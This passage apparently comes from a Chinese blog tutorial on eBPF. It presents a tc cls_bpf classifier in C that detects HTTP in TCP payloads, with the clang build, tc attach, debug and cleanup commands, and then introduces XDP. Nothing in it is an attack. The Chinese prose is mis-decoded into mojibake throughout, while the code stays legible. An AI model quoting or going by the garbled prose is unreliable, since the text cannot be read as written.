è½½å‰ä¸ƒä¸ªå­—èŠ‚ï¼Œä½äºTCPæœ‰æ•ˆè´Ÿè½½<code>poffset</code>çš„åç§»é‡å¤„ã€‚æ­¤æ—¶æˆ‘ä»¬å¯ä»¥æ£€æŸ¥å­—èŠ‚æ•°ç»„æ˜¯å¦æ˜¯ä¸€ä¸ªè¡¨ç¤ºHTTPçš„åºåˆ—ï¼›ç¬¬7å±‚åè®®æ˜¯HTTPï¼Œè¿”å›1ï¼Œå¦åˆ™è¿”å›0ã€‚</p><p><code>classifier.c</code>å®Œæ•´ç¨‹åºå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> clang diagnostic ignored <span class="meta-string">"-Wcompare-distinct-pointer-types"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/pkt_cls.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tcp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEC(NAME) __attribute__((section(NAME), used))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __bpf_htons(x) __builtin_bswap16(x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __bpf_constant_htons(x) ___constant_swab16(x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> __BYTE_ORDER__ == __ORDER_BIG_ENDIAN__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __bpf_htons(x) (x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __bpf_constant_htons(x) (x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">error</span> <span class="meta-string">"Fix your compiler's __BYTE_ORDER__?!"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bpf_htons(x) \</span></span><br><span class="line">  (__builtin_constant_p(x) ? __bpf_constant_htons(x) : __bpf_htons(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*bpf_trace_printk)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fmt, <span class="keyword">int</span> fmt_size,</span></span></span><br><span class="line"><span class="function"><span class="params">                               ...)</span> </span>= (<span class="keyword">void</span> *)BPF_FUNC_trace_printk;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> trace_printk(fmt, ...)                                                 \</span></span><br><span class="line">  <span class="keyword">do</span> &#123;                                                                         \</span><br><span class="line">    <span class="keyword">char</span> _fmt[] = fmt;                                                         \</span><br><span class="line">    bpf_trace_printk(_fmt, <span class="keyword">sizeof</span>(_fmt), ##__VA_ARGS__);                       \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">load_byte</span><span class="params">(<span class="keyword">void</span> *skb,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> off)</span> <span class="title">asm</span><span class="params">(<span class="string">"llvm.bpf.load.byte"</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">http_payload</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> method;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">is_http</span><span class="params">(struct __sk_buff *skb, __u64 nh_off)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">__uint8_t</span> <span class="keyword">uint8_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">__uint16_t</span> <span class="keyword">uint16_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">__uint32_t</span> <span class="keyword">uint32_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">__uint64_t</span> <span class="keyword">uint64_t</span>;</span><br><span class="line"></span><br><span class="line">SEC(<span class="string">"classifier"</span>)</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">classification</span><span class="params">(struct __sk_buff *skb)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)skb-&gt;data_end;</span><br><span class="line">  <span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)skb-&gt;data;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ethhdr</span> *<span class="title">eth</span> = <span class="title">data</span>;</span></span><br><span class="line"></span><br><span class="line">  __u16 h_proto;</span><br><span class="line">  __u64 nh_off = <span class="number">0</span>;</span><br><span class="line">  nh_off = <span class="keyword">sizeof</span>(*eth);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (data + nh_off &gt; data_end) &#123;</span><br><span class="line">    <span class="keyword">return</span> TC_ACT_OK;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  h_proto = eth-&gt;h_proto;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (h_proto == bpf_htons(ETH_P_IP)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_http(skb, nh_off) == <span class="number">1</span>) &#123;</span><br><span class="line">      trace_printk(<span class="string">"Yes! It is HTTP!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> TC_ACT_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">is_http</span><span class="params">(struct __sk_buff *skb, __u64 nh_off)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)skb-&gt;data_end;</span><br><span class="line">  <span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)skb-&gt;data;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">iph</span> = <span class="title">data</span> + <span class="title">nh_off</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (iph + <span class="number">1</span> &gt; data_end) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (iph-&gt;protocol != IPPROTO_TCP) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  __u32 tcp_hlen = <span class="number">0</span>;</span><br><span class="line">  __u32 ip_hlen = <span class="number">0</span>;</span><br><span class="line">  __u32 poffset = <span class="number">0</span>;</span><br><span class="line">  __u32 plength = <span class="number">0</span>;</span><br><span class="line">  __u32 ip_total_length = iph-&gt;tot_len;</span><br><span class="line"></span><br><span class="line">  ip_hlen = iph-&gt;ihl &lt;&lt; <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ip_hlen &lt; <span class="keyword">sizeof</span>(*iph)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> *<span class="title">tcph</span> = <span class="title">data</span> + <span class="title">nh_off</span> + <span class="title">sizeof</span>(*<span class="title">iph</span>);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcph + <span class="number">1</span> &gt; data_end) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  tcp_hlen = tcph-&gt;doff &lt;&lt; <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  poffset = ETH_HLEN + ip_hlen + tcp_hlen;</span><br><span class="line">  plength = ip_total_length - ip_hlen - tcp_hlen;</span><br><span class="line">  <span class="keyword">if</span> (plength &gt;= <span class="number">7</span>) &#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> p[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">      p[i] = load_byte(skb, poffset + i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> *value;</span><br><span class="line">    <span class="keyword">if</span> ((p[<span class="number">0</span>] == <span class="string">'H'</span>) &amp;&amp; (p[<span class="number">1</span>] == <span class="string">'T'</span>) &amp;&amp; (p[<span class="number">2</span>] == <span class="string">'T'</span>) &amp;&amp; (p[<span class="number">3</span>] == <span class="string">'P'</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> _license[] SEC(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br></pre></td></tr></table></figure><p>å®ç”¨Clangç¼–è¯‘å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -O2 -target bpf -c classifier.c -o classifier.o</span><br></pre></td></tr></table></figure><p>tcè¿”å›ç è¯´æ˜</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">TC_ACT_OK (0) , will terminate the packet processing  pipeline  and</span><br><span class="line">           allows the packet to proceed</span><br><span class="line">TC_ACT_SHOT (2) , will terminate the packet processing pipeline and</span><br><span class="line">           drops the packet</span><br><span class="line">TC_ACT_UNSPEC (-1) , will use the default action configured from tc</span><br><span class="line">           (similarly as returning -1 from a classifier)</span><br><span class="line">TC_ACT_PIPE (3) , will iterate to the next action, if available</span><br><span class="line">TC_ACT_RECLASSIFY  (1) , will terminate the packet processing pipe-</span><br><span class="line">           line and start classification from the beginning</span><br><span class="line">           else , everything else is an unspecified return code</span><br></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥åœ¨eth0ä¸Šå®‰è£…ç¨‹åºã€‚</p><p>ç¬¬ä¸€ä¸ªå‘½ä»¤å°†æ›¿æ¢eth0è®¾å¤‡çš„é»˜è®¤<code>qdisc</code>ï¼Œç¬¬äºŒä¸ªå‘½ä»¤å°†æˆ‘ä»¬çš„<code>cls_bpf</code>åˆ†ç±»å™¨åŠ è½½åˆ°<code>ingress</code>çš„æœ‰ç±»<code>qdisc</code>ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬çš„ç¨‹åºå°†å¤„ç†è¿›å…¥è¯¥æ¥å£çš„æ‰€æœ‰æµé‡ã€‚å¦‚æœæˆ‘ä»¬æƒ³å¤„ç†ä¼ å‡ºæµé‡ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨<code>egress qdisc</code>ä»£æ›¿ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tc qdisc add dev eth0 handle 0: ingress</span><br><span class="line">tc filter add dev eth0 ingress bpf obj classifier.o flowid 0:</span><br></pre></td></tr></table></figure><p>ç¨‹åºç°åœ¨å·²è¢«åŠ è½½â€”â€”æˆ‘ä»¬éœ€è¦å‘è¯¥æ¥å£å‘é€ä¸€äº›HTTPæµé‡ã€‚ç›´æ¥pythonèµ·ä¸€ä¸ªæœåŠ¡å™¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos tc]# python3 -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure><p>ä¹‹åé€šè¿‡<code>tc</code>è·å–è°ƒè¯•ä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos tc]# tc exec bpf dbg</span><br><span class="line">Running! Hang up with ^C!</span><br><span class="line">             python3-18456 [000] ..s1 283544.114997: 0: Yes! It is HTTP!</span><br><span class="line"> python3-18754 [002] ..s1 283566.008163: 0: Yes! It is HTTP!</span><br></pre></td></tr></table></figure><p>æœ€åé€šè¿‡<code>tc</code>å¸è½½åˆ†ç±»å™¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos tc]# tc qdisc del dev eth0 ingress</span><br></pre></td></tr></table></figure><h4 id="å…³äºact-bpfä»¥åŠcls-bpfçš„ä¸åŒä¹‹å¤„çš„è¯´æ˜"><a href="#å…³äºact-bpfä»¥åŠcls-bpfçš„ä¸åŒä¹‹å¤„çš„è¯´æ˜" class="headerlink" title="å…³äºact_bpfä»¥åŠcls_bpfçš„ä¸åŒä¹‹å¤„çš„è¯´æ˜"></a>å…³äºact_bpfä»¥åŠcls_bpfçš„ä¸åŒä¹‹å¤„çš„è¯´æ˜</h4><p>ä½ å¯èƒ½å·²ç»æ³¨æ„åˆ°BPFç¨‹åºå­˜åœ¨å¦ä¸€ä¸ªåä¸º<code>act_bpf</code>çš„å¯¹è±¡ã€‚<code>act_bpf</code>æ˜¯ä¸€ä¸ªåŠ¨ä½œï¼Œè€Œä¸æ˜¯åˆ†ç±»å™¨ã€‚åœ¨æ“ä½œä¸Šä¸åˆ†ç±»å™¨æœ‰æ‰€ä¸åŒï¼Œå› ä¸ºåŠ¨ä½œæ˜¯é™„åŠ åˆ°è¿‡æ»¤å™¨çš„å¯¹è±¡ï¼Œå› æ­¤å®ƒä¸èƒ½ç›´æ¥æ‰§è¡Œè¿‡æ»¤ï¼Œéœ€è¦æµé‡æ§åˆ¶æ‰€æœ‰æ•°æ®åŒ…ã€‚å¯¹äºæ­¤å±æ€§ï¼Œé€šå¸¸æœ€å¥½ä½¿ç”¨<code>cls_bpf</code>åˆ†ç±»å™¨è€Œä¸æ˜¯<code>act_bpf</code>æ“ä½œã€‚</p><h4 id="TCå’ŒXDPçš„åŒºåˆ«"><a href="#TCå’ŒXDPçš„åŒºåˆ«" class="headerlink" title="TCå’ŒXDPçš„åŒºåˆ«"></a>TCå’ŒXDPçš„åŒºåˆ«</h4><p>å°½ç®¡tcçš„<code>cls_bpf</code>å’ŒXDPç¨‹åºçœ‹èµ·æ¥éå¸¸ç›¸ä¼¼ï¼Œä½†å®ƒä»¬å´å¤§ä¸ç›¸åŒã€‚XDPç¨‹åºåœ¨è¿›å…¥ä¸»å†…æ ¸ç½‘ç»œå †æ ˆä¹‹å‰åœ¨å…¥å£æ•°æ®è·¯å¾„ä¸­è¾ƒæ—©æ‰§è¡Œï¼Œå› æ­¤æˆ‘ä»¬çš„ç¨‹åºæ— æ³•åƒtcé‚£æ ·è®¿é—®å¥—æ¥å­—ç¼“å†²åŒºç»“æ„ <code>sk_buff</code>ã€‚XDPç¨‹åºå–è€Œä»£ä¹‹çš„æ˜¯ä¸€ä¸ªç§°ä¸º<code>xdp_buff</code>çš„ä¸åŒç»“æ„ï¼Œå®ƒæ˜¯æ²¡æœ‰å…ƒæ•°æ®çš„æ•°æ®åŒ…è¡¨ç¤ºã€‚ä¾‹å¦‚ï¼Œå³ä½¿åœ¨å†…æ ¸ä»£ç ä¹‹å‰æ‰§è¡Œï¼ŒXDPç¨‹åºä¹Ÿå¯ä»¥æœ‰æ•ˆåœ°ä¸¢å¼ƒæ•°æ®åŒ…ã€‚ ä¸tcç¨‹åºç›¸æ¯”XDPç¨‹åºåªèƒ½é™„åŠ åˆ°è¿›å…¥ç³»ç»Ÿçš„æµé‡ã€‚</p><p>ä½ å¯èƒ½ä¼šé—®ä»€ä¹ˆæ—¶å€™ä½¿ç”¨XDPï¼Ÿç­”æ¡ˆæ˜¯ï¼Œç”±äºXDPç¨‹åºä¸åŒ…å«æ‰€æœ‰å†…æ ¸ä¸°å¯Œçš„æ•°æ®ç»“æ„å’Œå…ƒæ•°æ®çš„æ€§è´¨ï¼Œå› æ­¤æ›´é€‚åˆOSIæ¨¡å‹çš„1åˆ°4å±‚ã€‚</p><h3 id="ç»“è®º-1"><a href="#ç»“è®º-1" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h3><p>ç°åœ¨ä½ åº”è¯¥å¾ˆæ¸…æ¥šBPFç¨‹åºå¯¹äºåœ¨ç½‘ç»œæ•°æ®è·¯å¾„çš„ä¸åŒçº§åˆ«è·å¾—å¯è§æ€§å’Œæ§åˆ¶å¾ˆæœ‰ç”¨ã€‚ä¹Ÿå·²ç»äº†è§£äº†å¦‚ä½•åˆ©ç”¨å®ƒä»¬æ¥è¿‡æ»¤æ•°æ®åŒ…ï¼Œä½¿ç”¨ç”ŸæˆBPFç¨‹åºé›†çš„é«˜çº§å·¥å…·ã€‚ç„¶åæˆ‘ä»¬å°†ç¨‹åºåŠ è½½åˆ°ç½‘ç»œå¥—æ¥å­—ï¼Œæœ€åæˆ‘ä»¬å°†ç¨‹åºé™„åŠ åˆ°æµé‡æ§åˆ¶å…¥å£<code>qdisc</code>ä»¥ä½¿ç”¨BPFç¨‹åºè¿›è¡Œæµé‡åˆ†ç±»ã€‚åœ¨æœ¬ç« ä¸­ï¼Œæˆ‘ä»¬è¿˜ç®€è¦è®¨è®ºäº†XDPï¼Œåç»­æˆ‘ä»¬ä¼šé€šè¿‡æ‰©å±• XDP ç¨‹åºçš„æ„å»ºæ–¹å¼ã€XDPç¨‹åºçš„ç±»å‹ä»¥åŠå¦‚ä½•ç¼–å†™å’Œæµ‹è¯•å®ƒä»¬æ¥å®Œæ•´å­¦ä¹ XDPã€‚</p><h2 id="ç¬¬ä¸ƒç« èŠ‚"><a href="#ç¬¬ä¸ƒç« èŠ‚" class="headerlink" title="ç¬¬ä¸ƒç« èŠ‚"></a>ç¬¬ä¸ƒç« èŠ‚</h2><h3 id="Express-Data-Path"><a href="#Express-Data-Path" class="headerlink" title="Express Data Path"></a>Express Data Path</h3><p>å¿«é€Ÿæ•°æ®è·¯å¾„(XDP)æ˜¯Linuxç½‘ç»œæ•°æ®è·¯å¾„ä¸­å®‰å…¨ã€å¯ç¼–ç¨‹ã€é«˜æ€§èƒ½ã€å†…æ ¸é›†æˆçš„æ•°æ®åŒ…å¤„ç†å™¨ï¼Œå½“NICé©±åŠ¨ç¨‹åºæ¥æ”¶åˆ°æ•°æ®åŒ…æ—¶ï¼Œå®ƒä¼šæ‰§è¡ŒBPFç¨‹åºã€‚è¿™å…è®¸XDPç¨‹åºåœ¨å°½å¯èƒ½æ—©çš„æ—¶é—´ç‚¹å°±å¯¹æ¥æ”¶åˆ°çš„æ•°æ®åŒ…åšå‡ºå†³å®šï¼ˆä¸¢å¼ƒã€ä¿®æ”¹æˆ–ä»…å…è®¸ï¼‰ã€‚</p><p>æ‰§è¡Œç‚¹å¹¶ä¸æ˜¯ä½¿XDPç¨‹åºå¿«é€Ÿè¿è¡Œçš„å”¯ä¸€æ–¹é¢ï¼›å…¶ä»–è®¾è®¡å†³ç­–åœ¨å…¶ä¸­ä¹Ÿå‘æŒ¥ä½œç”¨ï¼š</p><ul><li>ä½¿ç”¨XDPè¿›è¡Œæ•°æ®åŒ…å¤„ç†æ—¶æ²¡æœ‰å†…å­˜åˆ†é…ã€‚</li><li>XDPç¨‹åºä»…é€‚ç”¨äºçº¿æ€§çš„ã€æœªåˆ†æ®µçš„æ•°æ®åŒ…ï¼Œå¹¶ä¸”å«æœ‰æ•°æ®åŒ…çš„å¼€å§‹å’Œç»“æŸæŒ‡é’ˆã€‚</li><li>æ— æ³•è®¿é—®å®Œæ•´çš„æ•°æ®åŒ…å…ƒæ•°æ®ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¿™ç§ç¨‹åºæ¥æ”¶çš„è¾“å…¥ä¸Šä¸‹æ–‡å°†æ˜¯<code>xdp_buff</code> ç±»å‹ï¼Œè€Œä¸æ˜¯åœ¨ä¹‹å‰é‡åˆ°çš„<code>sk_buff</code>ç»“æ„ã€‚</li><li>å› ä¸ºæ˜¯eBPFç¨‹åºï¼Œæ‰€ä»¥XDPç¨‹åºå…·æœ‰æœ‰é™çš„æ‰§è¡Œæ—¶é—´ï¼Œå…¶ç»“æœæ˜¯å®ƒä»¬çš„ä½¿ç”¨åœ¨ç½‘ç»œç®¡é“ä¸­å…·æœ‰å›ºå®šæˆæœ¬ã€‚</li></ul><p>è°ˆåˆ°XDPæ—¶ï¼Œé‡è¦çš„æ˜¯è¦è®°ä½å®ƒä¸æ˜¯å†…æ ¸ç»•è¿‡æœºåˆ¶ï¼›å®ƒæ—¨åœ¨ä¸å…¶ä»–å†…æ ¸ç»„ä»¶å’Œå†…éƒ¨Linuxå®‰å…¨æ¨¡å‹é›†æˆã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xdp_buffç»“æ„ç”¨äºå‘ä½¿ç”¨XDPæ¡†æ¶æä¾›çš„ç›´æ¥æ•°æ®åŒ…è®¿é—®æœºåˆ¶çš„BPFç¨‹åºæä¾›æ•°æ®åŒ…ä¸Šä¸‹æ–‡ã€‚å¯ä»¥å°†å…¶è§†ä¸ºsk_buffçš„â€œè½»é‡çº§â€ç‰ˆæœ¬ã€‚</span><br><span class="line">ä¸¤è€…ä¹‹é—´çš„åŒºåˆ«åœ¨äºsk_buffè¿˜ä¿ç•™å¹¶å…è®¸æ‚¨ä¸æ•°æ®åŒ…çš„å…ƒæ•°æ®ï¼ˆprotoã€markã€typeï¼‰æ··åˆï¼Œè¿™äº›å…ƒæ•°æ®ä»…åœ¨ç½‘ç»œç®¡é“ä¸­çš„æ›´é«˜çº§åˆ«å¯ç”¨ã€‚ xdp_buffæ˜¯æ—©æœŸåˆ›å»ºçš„å¹¶ä¸”ä¸ä¾èµ–äºå…¶ä»–å†…æ ¸å±‚çš„äº‹å®æ˜¯ä½¿ç”¨XDPè·å–å’Œå¤„ç†æ•°æ®åŒ…æ›´å¿«çš„åŸå› ä¹‹ä¸€ã€‚ å¦ä¸€ä¸ªåŸå› æ˜¯xdp_buffä¸åŒ…å«å¯¹è·¯ç”±ã€æµé‡æ§åˆ¶æŒ‚é’©æˆ–å…¶ä»–ç±»å‹çš„æ•°æ®åŒ…å…ƒæ•°æ®çš„å¼•ç”¨ï¼Œå°±åƒä½¿ç”¨sk_buffçš„ç¨‹åºç±»å‹ä¸€æ ·ã€‚</span><br></pre></td></tr></table></figure><h3 id="XDPç¨‹åºæ¦‚è¿°"><a href="#XDPç¨‹åºæ¦‚è¿°" class="headerlink" title="XDPç¨‹åºæ¦‚è¿°"></a>XDPç¨‹åºæ¦‚è¿°</h3><p>ä»æœ¬è´¨ä¸Šè®²ï¼ŒXDPç¨‹åºæ‰€åšçš„æ˜¯å¯¹æ¥æ”¶åˆ°çš„æ•°æ®åŒ…åšå‡ºå†³å®šï¼Œç„¶åç¼–è¾‘æ¥æ”¶åˆ°çš„æ•°æ®åŒ…çš„å†…å®¹æˆ–ä»…è¿”å›ç»“æœä»£ç ã€‚ç»“æœä»£ç ç”¨äºä»¥æ“ä½œçš„å½¢å¼ç¡®å®šæ•°æ®åŒ…å‘ç”Ÿçš„æƒ…å†µã€‚ä½ å¯ä»¥ä¸¢å¼ƒè¿™ä¸ªåŒ…ï¼Œå¯ä»¥æŠŠå®ƒä»åŒä¸€ä¸ªæ¥å£ä¼ è¾“å‡ºå»ï¼Œæˆ–è€…å¯ä»¥æŠŠå®ƒä¼ é€’ç»™ç½‘ç»œæ ˆçš„å…¶ä½™éƒ¨åˆ†ã€‚æ­¤å¤–ï¼Œä¸ºäº†ä¸ç½‘ç»œæ ˆåä½œï¼ŒXDPç¨‹åºå¯ä»¥æ¨é€å’Œæ‹‰å–æ•°æ®åŒ…çš„å¤´éƒ¨ï¼›ä¾‹å¦‚ï¼Œå¦‚æœå½“å‰å†…æ ¸ä¸æ”¯æŒå°è£…æ ¼å¼æˆ–åè®®ï¼ŒXDPç¨‹åºå¯ä»¥å°†å…¶è§£å°è£…æˆ–ç¿»è¯‘åè®®å¹¶å°†ç»“æœå‘é€ç»™å†…æ ¸è¿›è¡Œå¤„ç†ã€‚</p><p>ä½†æ˜¯XDPå’ŒeBPFä¹‹é—´æœ‰ä»€ä¹ˆå…³è”å‘¢ï¼Ÿ</p><p>äº‹å®è¯æ˜ï¼ŒXDPç¨‹åºæ˜¯é€šè¿‡bpfç³»ç»Ÿè°ƒç”¨æ§åˆ¶å¹¶ä½¿ç”¨ç¨‹åºç±»å‹<code>BPF_PROG_TYPE_XDP</code>åŠ è½½çš„ã€‚ æ­¤å¤–ï¼Œæ‰§è¡Œé©±åŠ¨ç¨‹åºæŒ‚é’©ä¹Ÿè¦æ‰§è¡ŒBPFå­—èŠ‚ç 